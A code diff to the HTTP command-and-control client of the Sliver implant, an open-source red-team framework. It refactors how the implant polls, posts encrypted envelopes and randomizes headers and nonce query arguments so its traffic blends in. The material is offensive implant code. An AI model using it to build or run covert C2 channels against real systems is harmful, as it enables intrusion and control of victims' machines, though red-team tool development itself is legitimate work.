@@ -26,7 +26,6 @@ import (
 	"errors"
 	"fmt"
 	"io"
-	"io/ioutil"
 	insecureRand "math/rand"
 	"net/http"
 	"net/url"
@@ -46,20 +45,24 @@ import (
 	"google.golang.org/protobuf/proto"
 )
 
-const (
-	goHTTPDriver  = "go"
-	wininetDriver = "wininet"
-
-	userAgent         = "{{GenerateUserAgent}}"
-	nonceQueryArgs    = "abcdefghijklmnopqrstuvwxyz_"
-	acceptHeaderValue = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
-)
-
 var (
-	ErrClosed               = errors.New("http session closed")
-	ErrStatusCodeUnexpected = errors.New("unexpected http response code")
-	TimeDelta time.Duration = 0
+	wininetDriver = "wininet"
+	goHTTPDriver  = "go"
+
+	userAgent      = "{{GenerateUserAgent}}"
+	nonceQueryArgs = "{{.HTTPC2ImplantConfig.NonceQueryArgs}}" // "abcdefghijklmnopqrstuvwxyz"
+
+	ErrClosed                             = errors.New("http session closed")
+	ErrStatusCodeUnexpected               = errors.New("unexpected http response code")
+	TimeDelta               time.Duration = 0
 )
+
+// {{if .Config.Debug}} -- UNIT TESTS ONLY
+func SetNonceQueryArgs(queryArgs string) {
+	nonceQueryArgs = queryArgs
+}
+
+// {{end}}
 
 // HTTPOptions - c2 specific configuration options
 type HTTPOptions struct {
@@ -69,7 +72,6 @@ type HTTPOptions struct {
 	PollTimeout          time.Duration
 	MaxErrors            int
 	ForceHTTP            bool
-	DisableAcceptHeader  bool
 	DisableUpgradeHeader bool
 	HostHeader           string
 
@@ -109,7 +111,6 @@ func ParseHTTPOptions(c2URI *url.URL) *HTTPOptions {
 		PollTimeout:          pollTimeout,
 		MaxErrors:            maxErrors,
 		ForceHTTP:            c2URI.Query().Get("force-http") == "true",
-		DisableAcceptHeader:  c2URI.Query().Get("disable-accept-header") == "true",
 		DisableUpgradeHeader: c2URI.Query().Get("disable-upgrade-header") == "true",
 		HostHeader:           c2URI.Query().Get("host-header"),
 
@@ -157,16 +158,16 @@ type HTTPDriver interface {
 
 // SliverHTTPClient - Helper struct to keep everything together
 type SliverHTTPClient struct {
-	Origin      string
-	PathPrefix  string
-	driver      HTTPDriver
-	ProxyURL    string
-	SessionCtx  *cryptography.CipherContext
-	SessionID   string
-	pollTimeout time.Duration
-	pollCancel  context.CancelFunc
-	pollMutex   *sync.Mutex
-	Closed      bool
+	Origin     string
+	PathPrefix string
+	driver     HTTPDriver
+	ProxyURL   string
+	SessionCtx *cryptography.CipherContext
+	SessionID  string
+	// pollTimeout time.Duration
+	pollCancel context.CancelFunc
+	pollMutex  *sync.Mutex
+	Closed     bool
 
 	Options *HTTPOptions
 }
@@ -193,7 +194,7 @@ func (s *SliverHTTPClient) SessionInit() error {
 }
 
 // NonceQueryArgument - Adds a nonce query argument to the URL
-func (s *SliverHTTPClient) NonceQueryArgument(uri *url.URL, value int) *url.URL {
+func (s *SliverHTTPClient) NonceQueryArgument(uri *url.URL, value uint64) *url.URL {
 	values := uri.Query()
 	key := nonceQueryArgs[insecureRand.Intn(len(nonceQueryArgs))]
 	argValue := fmt.Sprintf("%d", value)
@@ -228,10 +229,6 @@ func (s *SliverHTTPClient) newHTTPRequest(method string, uri *url.URL, body io.R
 		req.Host = s.Options.HostHeader
 	}
 	req.Header.Set("User-Agent", userAgent)
-	if method == http.MethodGet && !s.Options.DisableAcceptHeader {
-		req.Header.Set("Accept-Language", "en-US,en;q=0.9")
-		req.Header.Set("Accept", acceptHeaderValue)
-	}
 	if uri.Scheme == "http" && !s.Options.DisableUpgradeHeader {
 		req.Header.Set("Upgrade-Insecure-Requests", "1")
 	}
@@ -240,15 +237,34 @@ func (s *SliverHTTPClient) newHTTPRequest(method string, uri *url.URL, body io.R
 		Name        string
 		Value       string
 		Probability string
+		Methods     []string
 	}
 
 	// HTTP C2 Profile headers
 	extraHeaders := []nameValueProbability{
 		// {{range $header := .HTTPC2ImplantConfig.Headers}}
-		{Name: "{{$header.Name}}", Value: "{{$header.Value}}", Probability: "{{$header.Probability}}"},
+		{
+			Name:        "{{$header.Name}}",
+			Value:       "{{$header.Value}}",
+			Probability: "{{$header.Probability}}",
+			Methods: []string{
+				// {{range $method := $header.Methods}}
+				"{{$method}}",
+				// {{end}}
+			},
+		},
 		// {{end}}
 	}
 	for _, header := range extraHeaders {
+		// Empty array means all methods (backwards compatibility)
+		if len(header.Methods) > 0 {
+			if !contains(header.Methods, method) {
+				continue
+			}
+		}
+		// {{if .Config.Debug}}
+		log.Printf("Rolling to add HTTP header '%s: %s' (%s)", header.Name, header.Value, header.Probability)
+		// {{end}}
 		probability, _ := strconv.Atoi(header.Probability)
 		if 0 < probability {
 			roll := insecureRand.Intn(99) + 1
@@ -277,6 +293,15 @@ func (s *SliverHTTPClient) newHTTPRequest(method string, uri *url.URL, body io.R
 	}
 	req.URL.RawQuery = queryParams.Encode()
 	return req
+}
+
+func contains[T comparable](elements []T, v T) bool {
+	for _, s := range elements {
+		if v == s {
+			return true
+		}
+	}
+	return false
 }
 
 // Do - Wraps http.Client.Do with a context
@@ -312,7 +337,7 @@ func (s *SliverHTTPClient) DoPoll(req *http.Request) (*http.Response, []byte, er
 			done <- http.ErrHandlerTimeout
 		default:
 			if err == nil && resp != nil {
-				data, err = ioutil.ReadAll(resp.Body)
+				data, err = io.ReadAll(resp.Body)
 				defer resp.Body.Close()
 			}
 			// {{if .Config.Debug}}
@@ -329,8 +354,8 @@ func (s *SliverHTTPClient) DoPoll(req *http.Request) (*http.Response, []byte, er
 // We do our own POST here because the server doesn't have the
 // session key yet.
 func (s *SliverHTTPClient) establishSessionID(sessionInit []byte) error {
-	nonce, encoder := encoders.RandomEncoder()
-	payload := encoder.Encode(sessionInit)
+	nonce, encoder := encoders.RandomEncoder(0)
+	payload, _ := encoder.Encode(sessionInit)
 	reqBody := bytes.NewReader(payload)
 
 	uri := s.startSessionURL()
@@ -353,19 +378,19 @@ func (s *SliverHTTPClient) establishSessionID(sessionInit []byte) error {
 	if resp.StatusCode != http.StatusOK {
 		serverDateHeader := resp.Header.Get("Date")
 		if serverDateHeader != "" {
-				// If the request failed and there is a Date header, find the time difference and save it for the next request
-				curTime := time.Now().UTC()
-				serverTime, err := time.Parse(time.RFC1123, serverDateHeader)
-				if err == nil {
-					TimeDelta = serverTime.UTC().Sub(curTime)
-				}
+			// If the request failed and there is a Date header, find the time difference and save it for the next request
+			curTime := time.Now().UTC()
+			serverTime, err := time.Parse(time.RFC1123, serverDateHeader)
+			if err == nil {
+				TimeDelta = serverTime.UTC().Sub(curTime)
+			}
 		}
 		// {{if .Config.Debug}}
 		log.Printf("[http] non-200 response (%d): %v", resp.StatusCode, resp)
 		// {{end}}
 		return errors.New("send failed")
 	}
-	respData, err := ioutil.ReadAll(resp.Body)
+	respData, err := io.ReadAll(resp.Body)
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("[http] response read error: %s", err)
@@ -403,7 +428,7 @@ func (s *SliverHTTPClient) ReadEnvelope() (*pb.Envelope, error) {
 		return nil, errors.New("no session")
 	}
 	uri := s.pollURL()
-	nonce, encoder := encoders.RandomEncoder()
+	nonce, encoder := encoders.RandomEncoder(0)
 	s.NonceQueryArgument(uri, nonce)
 	req := s.newHTTPRequest(http.MethodGet, uri, nil)
 	// {{if .Config.Debug}}
@@ -478,9 +503,10 @@ func (s *SliverHTTPClient) WriteEnvelope(envelope *pb.Envelope) error {
 	}
 
 	uri := s.sessionURL()
-	nonce, encoder := encoders.RandomEncoder()
+	nonce, encoder := encoders.RandomEncoder(len(reqData))
 	s.NonceQueryArgument(uri, nonce)
-	reader := bytes.NewReader(encoder.Encode(reqData))
+	encodedValue, _ := encoder.Encode(reqData)
+	reader := bytes.NewReader(encodedValue)
 
 	// {{if .Config.Debug}}
 	log.Printf("[http] POST -> %s (%d bytes)", uri, len(reqData))
@@ -525,7 +551,7 @@ func (s *SliverHTTPClient) CloseSession() error {
 
 	// Tell server session is closed
 	uri := s.closeURL()
-	nonce, _ := encoders.RandomEncoder()
+	nonce, _ := encoders.RandomEncoder(0)
 	s.NonceQueryArgument(uri, nonce)
 	req := s.newHTTPRequest(http.MethodGet, uri, nil)
 	// {{if .Config.Debug}}
